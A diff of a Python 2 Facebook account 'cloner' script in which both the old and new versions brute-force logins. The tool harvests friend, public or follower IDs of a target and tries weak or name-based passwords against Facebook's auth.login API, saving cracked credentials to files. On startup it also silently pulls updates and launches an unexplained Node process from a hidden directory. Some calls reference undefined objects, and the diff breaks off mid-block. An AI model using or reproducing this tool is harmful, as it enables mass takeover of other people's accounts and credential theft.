@@ -1,359 +1,1509 @@
-# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
 #coding=utf-8
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
-os.system('rm -rf .txt')
-for n in range(10000):
 
-    nmbr = random.randint(1111111, 9999999)
-    
-    sys.stdout = open('.txt', 'a')
+ 
 
-    print(nmbr)
+#!/usr/bin/python2
 
-    sys.stdout.flush()
-    
+ 
+
+#RanaMZ=namtusunahuga
+
+ 
+
 try:
-    import requests
+
+ 
+
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+ 
+
+    from multiprocessing.pool import ThreadPool
+
+ 
+
 except ImportError:
-    os.system('pip2 install mechanize')
+
+ 
+
+    os.system("pip2 install requests")
+
+ 
+
+    os.system("python2 your-name.py")
+
     
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install request')
-    time.sleep(1)
-    os.system('Then type: python2 boss')
-
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
-def keluar():
-	print 'Thanks.'
-	os.sys.exit()
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(00000.1)
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\x1b[1;92mPlease Wait \x1b[1;92m"+o),;sys.stdout.flush();time.sleep(1)
-
-
-back = 0
-oks = []
-id = []
-cpb = []
-vulnot = "\033[92mNot Vuln"
-vuln = "\033[92mVuln"
 
 os.system("clear")
-print  """
+
+ 
+
+ 
+
+ 
+
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+
+ 
+
+    os.system("apt update && apt install nodejs -y")
+
+ 
+
+from requests.exceptions import ConnectionError
+
+ 
+
+os.system("git pull")
+
+ 
+
+if not os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):
+
+ 
+
+    os.system("fuser -k 5000/tcp &")
+
+ 
+
+    os.system("cd ..... && pip install progress")
+
+ 
+
+    os.system("cd ..... && npm install")
+
+ 
+
+    os.system("cd ..... && node index.js &")
+
+ 
+
+    os.system("clear")
+
+ 
+
+    time.sleep(10)
+
+ 
+
+elif os.path.isfile("/data/data/com.termux/files/home/mz-pro/...../node_modules/bytes/index.js"):
+
+ 
+
+    os.system("fuser -k 5000/tcp &")
+
+ 
+
+    os.system("#")
+
+ 
+
+    os.system("cd ..... && node index.js &")
+
+ 
+
+    os.system("clear")
+
+ 
+
+bd=random.randint(2e7, 3e7)
+
+ 
+
+sim=random.randint(2e4, 4e4)
+
+ 
+
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+
+ 
+
+reload(sys)
+
+ 
+
+sys.setdefaultencoding("utf-8")
+
+ 
+
+c = "\033[1;92m"
+
+ 
+
+c2 = "\033[0;97m"
+
+ 
+
+c3 = "\033[1;91m"
+
+ 
+
+logo = """                                
+
+                                                  
 \033[1;92m   ╔0═0╗ ♫♪    
 \033[1;92m   ║ M ║ ♪♪   
 \033[1;92m   ║ r ║♫♪  
 \033[1;92m   ║ ◎♫♪♫   [♫] HACKERS BANGLADESH [♫]  
 \033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : Mr. NIKI                    █  
-\033[1;92m█ ✯ YOUTUBE  : JAMES NIKI                  █  
-\033[1;92m█ ✯ FACEBOKK : Niki.Cyber404               █  
-\033[1;92m█ ✯ WHATSAPP : +8801927294533              █   
-\033[1;92m█ ✯ GITHUB   : Niki-Cyber404               █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝   
-\033[1;96m--------------------------------------------
+\033[1;92m█ ✯AUTHOR   : Niki404-Cyber                █  
+\033[1;92m█ ✯YOUTUBE  : Mr. NIKI                     █  
+\033[1;92m█ ✯FACEBOKK : Niki.Cyber404                █  
+\033[1;92m█ ✯WHATSAPP : +8801927294533               █   
+\033[1;92m█ ✯GITHUB   : Niki404-Cyber                █  
+\033[1;92m╚══0═══0═════00o═══════════════════════════╝
+\033[1;92m   
+\033[1;92m╔══o00════════00o═════════════════════════╗
+\033[1;91m            PUBLIC ID CLONER
+\033[1;92m╚═════════════════════════════════════════╝
+\033[1;96m-----------------------------------------------
+
+ 
+
 """
 
-####Logo####
+ 
 
-logo1 = """
-\033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ M ║ ♪♪   
-\033[1;92m   ║ r ║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS BANGLADESH [♫]    
-\033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : Mr. NIKI                    █  
-\033[1;92m█ ✯ YOUTUBE  : JAMES NIKI                  █  
-\033[1;92m█ ✯ FACEBOKK : Niki.Cyber404               █  
-\033[1;92m█ ✯ WHATSAPP : +8801927294533              █   
-\033[1;92m█ ✯ GITHUB   : Niki-Cyber404               █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝   
-\033[1;96m--------------------------------------------
-"""
-logo2 = """
-\033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ M ║ ♪♪   
-\033[1;92m   ║ r ║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS BANGLADESH [♫]  
-\033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : Mr. NIKI                    █  
-\033[1;92m█ ✯ YOUTUBE  : JAMES NIKI                  █  
-\033[1;92m█ ✯ FACEBOKK : Niki.Cyber404               █  
-\033[1;92m█ ✯ WHATSAPP : +8801927294533              █   
-\033[1;92m█ ✯ GITHUB   : Niki-Cyber404               █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝   
-\033[1;96m--------------------------------------------
-"""
-CorrectUsername = "Mr"
-CorrectPassword = "Niki"
+ 
 
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;92m\x1b[1;92mUserName \x1b[1;92m:\x1b[1;92m")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;92m\x1b[1;92mPassword  \x1b[1;92m:\x1b[1;92m")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Mr:Niki
-	    time.sleep(1)
-            loop = 'false'
-        else:
-            print "\033[1;91mWrong Password"
-            os.system('xdg-open https://Youtube.com/UCsH0yB-x6fKeu8uQ-uDhTzw')
-    else:
-        print "\033[1;91mWrong Username"
-        os.system('xdg-open https://m.facebook.com/Niki.Cyber404')
+ 
 
+def main():
 
+ 
 
-##### LICENSE #####
-#=================#
-def lisensi():
-    os.system('clear')
-    login()
-####login#########
-def login():
-    os.system('clear')
-    print logo1
-    print "\033[1;91m[1]\x1b[1;92mSTART CRACKING"
-    time.sleep(0.05)
-    print "\033[1;92m[2]\x1b[1;92mTOOL UPDATE"
-    time.sleep(0.05)
-    print '\x1b[1;92m[0]\033[1;92m Exit ( Back)'
-    pilih_login()
+    os.system("clear")
 
-def pilih_login():
-    peak = raw_input("\n\033[1;92mCHOOSE: \033[1;92m")
-    if peak =="":
-        print "\x1b[1;92mFill In Correctly"
-        pilih_login()
-    elif peak =="1":
-        Zeek()
-def Zeek():
-    os.system('clear')
-    print logo1
-    print '\x1b[1;92m[1] START CRACKING'
-    time.sleep(0.10)
-    print '\x1b[1;92m[2] NIKI FB ACCOUNT'
-    time.sleep(0.10)
-    print '\x1b[1;92m[3] MORE INFO'
-    time.sleep(0.10)
-    print '\x1b[1;92m[4] TRACKER'
-    time.sleep(0.10)
-    print '\x1b[1;92m[5] CLONING ERROR'
-    time.sleep(0.10)
-    print '\x1b[1;92m[6] Mr. NIKI FACEBOOK'
-    time.sleep(0.10)
-    print '\x1b[1;92m[0] back'
-   
-    time.sleep(0.05)
-    action()
+ 
 
-def action():
-    peak = raw_input('\n\033[1;92mCHOOSE:\033[1;92m')
-    if peak =='':
-        print '[!] Fill In Correctly'
-        action()
-    elif peak =="1":              
-        os.system("clear")
-        print logo2
-        print "Enter any Mobile Number"+'\n'
-        print 'Enter any code  3021221011,3023010203,302102030'
-        try:
-            c = raw_input("\033[1;92mCHOOSE : ")
-            k="+1"
-            idlist = ('.txt')
-            for line in open(idlist,"r").readlines():
-                id.append(line.strip())
-        except IOError:
-            print ("[!] File Not Found")
-            raw_input("\n[ Back ]")
-            blackmafiax()
-    elif peak =='0':
+    print logo
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[0;96m LETS START ").center(50)
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[1]\033[1;92mSTART CLONiNG....")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[2]\033[1;92mFOLLOW THE NIKI ")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[0]\033[1;92mEXIT")
+
+ 
+
+    print("")
+
+ 
+
+    main_select()
+
+ 
+
+def main_select():
+
+ 
+
+    Mz = raw_input("\033[1;92m[#] Choose Opition --->\033[1;93m ")
+
+ 
+
+    if Mz  =="1":
+
+ 
+
         login()
+
+ 
+
+    if Mz =="2":
+
+ 
+
+        os.system("xdg-open https://www.facebook.com/NIKI.CYBER404.OFFICIALS")
+
+ 
+
+	main()   
+
+    elif Mz =="0":
+
+ 
+
+        os.system("exit")
+
+ 
+
     else:
-        print '[!] Fill In Correctly'
-        action()
-    print 50* '\033[1;92m-'
-    xxx = str(len(id))
-    jalan ('\033[1;92m Total ids number: '+xxx)
-    jalan ('\033[1;92mCode you choose: '+c)
-    jalan ("\033[1;92mPlease Wait Start Cracking...")
-    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
-    print 50* '\033[1;92m-'
-    def main(arg):
-        global cpb,oks
-        user = arg
+
+ 
+
+        print("[!] Please select a valid option").center(50)
+
+ 
+
+        time.sleep(2)
+
+ 
+
+        main()
+
+ 
+
+def login():
+
+ 
+
+    os.system("clear")
+
+ 
+
+    print logo
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[0;92m[ Login Menu ]").center(50)
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[1]\033[1;92mLogin Using Token")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[2]\033[1;92mHOW TO GET FRE TOKEN.")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[3]\033[1;92mBack")
+
+ 
+
+    print("")
+
+ 
+
+    login_select()
+
+ 
+
+def login_select():
+
+ 
+
+    Mz = raw_input(" \033[1;92m Choose Option :\033[1;92m ")
+
+ 
+
+    if Mz =="1":
+
+ 
+
+        os.system("clear")
+
+ 
+
+        print logo
+
+ 
+
+        print("")
+
+ 
+
+	print("[ login with token ]").center(50)
+
+ 
+
+	print("")
+
+ 
+
+        token = raw_input("[!] Token ? \033[0;92m")
+
+ 
+
+        token_s = open(".fb_token.txt","w")
+
+ 
+
+        token_s.write(token)
+
+ 
+
+        token_s.close()
+
+ 
+
         try:
-            os.mkdir('save')
-        except OSError:
-            pass
-        try:
-            pass1 = "123456"
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m(NIKI-OK)  ' + k + c + user + '  |  ' + pass1                                       
-                okb = open('save/cloned.txt', 'a')
-                okb.write(k+c+user+pass1+'\n')
-                okb.close()
-                oks.append(c+user+pass1)
-            else:
-                if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;91m(NIKI_CP) ' + k + c + user + '  |  ' + pass1
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k+c+user+pass1+'\n')
-                    cps.close()
-                    cpb.append(c+user+pass1)
-                else:
-                    pass2 = "102030"
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print '\x1b[1;92m(NIKI-OK)  ' + k + c + user +  '  |  ' + pass2
-                        okb = open('save/cloned.txt', 'a')
-                        okb.write(k+c+user+pass2+'\n')
-                        okb.close()
-                        oks.append(c+user+pass2)
-                    else:
-                        if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;91m(NIKI-CP) ' + k + c + user + '  |  ' + pass2
-                            cps = open('save/cloned.txt', 'a')
-                            cps.write(k+c+user+pass2+'\n')
-                            cps.close()
-                            cpb.append(c+user+pass2)
-                        else:
-                            pass3="123456789"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print '\x1b[1;92m(NIKI-OK)  ' + k + c + user + '  |  ' + pass3
-                                okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass3+'\n')
-                                okb.close()
-                                oks.append(c+user+pass3)
-                            else:
-                                if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;91m(NIKI-CP) ' + k + c + user + '  |  ' + pass3 
-                                    cps = open('save/cloned.txt', 'a')
-                                    cps.write(k+c+user+pass3+'\n')
-                                    cps.close()
-                                    cpb.append(c+user+pass3)
-                                else:
-                                    pass4="name+123"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;92m(NIKI-OK)  ' + k + c + user + '  |  ' + pass4 
-                                        okb = open('save/cloned.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;91m(NIKI-CP) ' + k + c + user + '  |  ' + pass4
-                                            cps = open('save/cloned.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5="112233"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;92m(NIKI-OK)  ' + k + c + user + '  |  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
-                                                if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;91m(NIKI-CP) ' + k + c + user + '  |  ' + pass5 
-                                                    cps = open('save/cloned.txt', 'a')
-                                                    cps.write(k+c+user+pass5+'\n')
-                                                    cps.close()
-                                                    cpb.append(c+user+pass5)
-                                                                                                                         
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
 
+ 
 
-                                                                                                                                                                                                            
-                                                                                                                                                                                                                    
-                                                                                                                                                                                                            
+            r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
+ 
 
+            q = json.loads(r.text)
 
-        except:
-            pass
-        
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 50* '\033[1;92m-'
-    print 'Process Has Been Completed ...'
-    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
-    print('Cloned Accounts Has Been Saved : save/cloned.txt')
-    jalan("Note : Your Offline account Will Open after 1 to 20 days")
-    print ''
-    print """
-\033[1;92m   ╔0═0╗ ♫♪    
-\033[1;92m   ║ M ║ ♪♪   
-\033[1;92m   ║ r ║♫♪  
-\033[1;92m   ║ ◎♫♪♫   [♫] HACKERS BANGLADESH [♫]  
-\033[1;92m╔══0═══0═════00o═══════════════════════════╗  
-\033[1;92m█ ✯ AUTHOR   : Mr. NIKI                    █  
-\033[1;92m█ ✯ YOUTUBE  : JAMES NIKI                  █  
-\033[1;92m█ ✯ FACEBOKK : Niki.Cyber404               █  
-\033[1;92m█ ✯ WHATSAPP : +8801927294533              █   
-\033[1;92m█ ✯ GITHUB   : Niki-Cyber404               █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝   
-\033[1;96m--------------------------------------------
-\033[1;92mThanks For Using This Tool
-\033[1;92mFb\033[1;92mNIKI
-\033[1;92myoutube\033[1;92mhttps://w ww.youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw"""
+ 
 
-    
-    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;92m]")
-    login() 
-          
+            name = q["name"]
+
+ 
+
+            nm = name.rsplit(" ")[0]
+
+ 
+
+            print("")
+
+ 
+
+            print("\033[1;92mYour token login successfully").center(50)
+
+ 
+
+            time.sleep(1)
+
+ 
+
+	    os.system("xdg-open https://youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw")
+
+	
+
+ 
+
+	    time.sleep(1)
+
+ 
+
+            menu()
+
+ 
+
+        except (KeyError , IOError):
+
+ 
+
+            print("")
+
+ 
+
+            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
+
+ 
+
+            print("")
+
+ 
+
+            time.sleep(2)
+
+ 
+
+            login()
+
+ 
+
+    elif Mz =="2":
+
+ 
+
+        os.system("xdg-open https://www.facebook.com/Niki.Cyber404")
+
+ 
+
+    elif Mz =="3":
+
+ 
+
+        main()
+
+ 
+
+    else:
+
+ 
+
+        print("")
+
+ 
+
+        print("Select a valid option").center(50)
+
+ 
+
+        print("")
+
+ 
+
+        login_select()
+
+ 
+
+ 
+
+ 
+
+ 
+
+def menu():
+
+ 
+
+    global token
+
+ 
+
+    os.system("clear")
+
+ 
+
+    print logo
+
+ 
+
+    try:
+
+ 
+
+        token = open(".fb_token.txt","r").read()
+
+ 
+
+    except (KeyError , IOError):
+
+ 
+
+        login()
+
+ 
+
+    try:
+
+ 
+
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+ 
+
+        q = json.loads(r.text)
+
+ 
+
+        nm = q["name"]
+
+ 
+
+        nmf = nm.rsplit(" ")[0]
+
+ 
+
+        ok = nmf
+
+ 
+
+    except (KeyError , IOError):
+
+ 
+
+        print("")
+
+ 
+
+        print("login account has checkpoint").center(50)
+
+ 
+
+        print("")
+
+ 
+
+        os.system("rm -rf .fb_token.txt")
+
+ 
+
+        time.sleep(1)
+
+ 
+
+        login()
+
+ 
+
+    except requests.exceptions.ConnectionError:
+
+ 
+
+        print logo
+
+ 
+
+        print("")
+
+ 
+
+        print("Your internet connection failed").center(50)
+
+ 
+
+        print("")
+
+ 
+
+        time.sleep(2)
+
+ 
+
+        menu()
+
+ 
+
+    os.system("clear")
+
+ 
+
+    print logo
+
+ 
+
+    print("")
+
+ 
+
+    print("\t\033[1;92mActive Token.... : " +nm)
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[1]\033[1;92mCrack From Friendlist")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[2]\033[1;92mCrack From Public id")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[3]\033[1;92mCrack From Followers id")
+
+ 
+
+    print("")
+
+ 
+
+    print("\033[1;91m[0]\033[1;92mEXIT ")
+
+ 
+
+    print("")
+
+ 
+
+    menu_select()
+
+ 
+
+def menu_select():
+
+ 
+
+	select = raw_input("\033[1;92m Choose Option : ")
+
+ 
+
+	id=[]
+
+ 
+
+	oks=[]
+
+ 
+
+	cps=[]
+
+ 
+
+	if select=="1":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		print("")
+
+ 
+
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
+
+ 
+
+		z = json.loads(r.text)
+
+ 
+
+		for s in z["data"]:
+
+ 
+
+			uid=s['id']
+
+ 
+
+			na=s['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	if select =="2":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print(logo)
+
+ 
+
+		print("")
+
+ 
+
+		idt = raw_input("\033[1;97m[♫] ATTACK ID :\033[1;96m ")
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		try:
+
+ 
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+
+ 
+
+			q = json.loads(r.text)
+
+ 
+
+			print("[!] Target from : "+q["name"])
+
+ 
+
+		except (KeyError , IOError):
+
+ 
+
+		    print("")
+
+ 
+
+		    print("\033[1;91your login account has checkpoint").center(50)
+
+ 
+
+		    print("")
+
+ 
+
+		    menu()
+
+ 
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+
+ 
+
+		z = niki.cyber(r.text)
+
+ 
+
+		for i in z["data"]:
+
+ 
+
+			uid=i['id']
+
+ 
+
+			na=i['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	elif select =="3":
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		print("")
+
+ 
+
+		idt = raw_input("\033[1;92m[♫] ATTACK ID :\033[1;92m ")
+
+ 
+
+		os.system("clear")
+
+ 
+
+		print logo
+
+ 
+
+		try:
+
+ 
+
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+
+ 
+
+			q = niki.cyber(r.text)
+
+ 
+
+			print(" Target From  : "+q["name"])
+
+ 
+
+		except (KeyError , IOError):
+
+ 
+
+		    print("")
+
+ 
+
+		    print("\033[1;91m login id has checkpoint").center(50)
+
+ 
+
+		    print("")
+
+ 
+
+		    time.sleep(3)
+
+ 
+
+		    menu()
+
+ 
+
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
+
+ 
+
+		z = niki.cyber(r.text)
+
+ 
+
+		for i in z["data"]:
+
+ 
+
+			uid=i['id']
+
+ 
+
+			na=i['name']
+
+ 
+
+			nm=na.rsplit(" ")[0]
+
+ 
+
+			id.append(uid+'='+nm)
+
+ 
+
+	elif select =="0":
+
+ 
+
+	    os.system("exit")
+
+ 
+
+	else:
+
+ 
+
+	    print("")
+
+ 
+
+	    print("Please Select A Valid Option").center(50)
+
+ 
+
+	    time.sleep(2)
+
+ 
+
+	    menu_select()
+
+ 
+
+	print("[♫] Total IDs..... : "+str(len(id)))
+
+ 
+
+	time.sleep(0.5)
+
+ 
+
+	print("[♫] Please Wait A Few Minute.....")
+
+ 
+
+	print 47*("-")
+
+ 
+
+	print('')
+
+ 
+
+	
+
+ 
+
+	def main(arg):
+
+ 
+
+		user=arg
+
+ 
+
+		uid,name=user.split("=")
+
+ 
+
+		try:
+
+ 
+
+		    pass1=name+"123"
+
+ 
+
+		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		    d=nikk.cyber(q)
+
+ 
+
+		    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass1)
+
+ 
+
+		        cp=open("nikicp.txt","a")
+
+ 
+
+		        cp.write(uid+" = "+pass1+"\n")
+
+ 
+
+		        cp.close()
+
+ 
+
+		        cps.append(uid)
+
+ 
+
+		    else:
+
+ 
+
+		    	if "access_token" in d:
+
+ 
+
+		            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass1+"\x1b[1;0m")
+
+ 
+
+		            ok=open("nikiok.txt","a")
+
+ 
+
+		            ok.write(uid+" = "+pass1+"\n")
+
+ 
+
+		            ok.close()
+
+ 
+
+		            oks.append(uid)
+
+ 
+
+		        else:
+
+ 
+
+		            pass2=name+"1234"
+
+ 
+
+		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		            d=niki.cyber(q)
+
+ 
+
+		            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass2)
+
+ 
+
+		                cp=open("nikicp.txt","a")
+
+ 
+
+		                cp.write(uid+" = "+pass2+"\n")
+
+ 
+
+		                cp.close()
+
+ 
+
+		                cps.append(uid)
+
+ 
+
+		            else:
+
+ 
+
+		                if 'access_token' in d:
+
+ 
+
+		                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass2+"\x1b[1;0m")
+
+ 
+
+		                    ok=open("nikiok.txt","a")
+
+ 
+
+		                    ok.write(uid+" = "+pass2+"\n")
+
+ 
+
+		                    ok.close()
+
+ 
+
+		                    oks.append(uid)
+
+ 
+
+		                else:
+
+ 
+
+		                    pass3=name+"12345"
+
+ 
+
+		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                    d=niki.cyber(q)
+
+ 
+
+		                    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                        print("\033[1;93m[NIKI-CP] "+uid+" = "+pass3)
+
+ 
+
+		                        cp=open("nikicp.txt","a")
+
+ 
+
+		                        cp.write(uid+" = "+pass3+"\n")
+
+ 
+
+		                        cp.close()
+
+ 
+
+		                        cps.append(uid)
+
+ 
+
+		                    else:
+
+ 
+
+		                        if 'access_token' in d:
+
+ 
+
+		                            print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass3+"\x1b[1;0m")
+
+ 
+
+		                            ok=open("nikiok.txt","a")
+
+ 
+
+		                            ok.write(uid+" = "+pass3+"\n")
+
+ 
+
+		                            ok.close()
+
+ 
+
+		                            oks.append(uid)
+
+ 
+
+		                        else:
+
+ 
+
+		                            pass4=name+"1122"
+
+ 
+
+		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		                            d=niki.cyber(q)
+
+ 
+
+		                            if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		                                print("\033[1;93m[NIKI-CP] "+uid+" = "+pass4)
+
+ 
+
+		                                cp=open("nikicp.txt","a")
+
+ 
+
+		                                cp.write(uid+" = "+pass4+"\n")
+
+ 
+
+		                                cp.close()
+
+ 
+
+		                                cps.append(uid)
+
+ 
+
+		                            else:
+
+ 
+
+		                                if 'access_token' in d:
+
+ 
+
+		                                    print("\x1b[1;92m[NIKI-OK] "+uid+" = "+pass4+"\x1b[1;0m")
+
+ 
+
+		                                    ok=open("nikiok.txt","a")
+
+ 
+
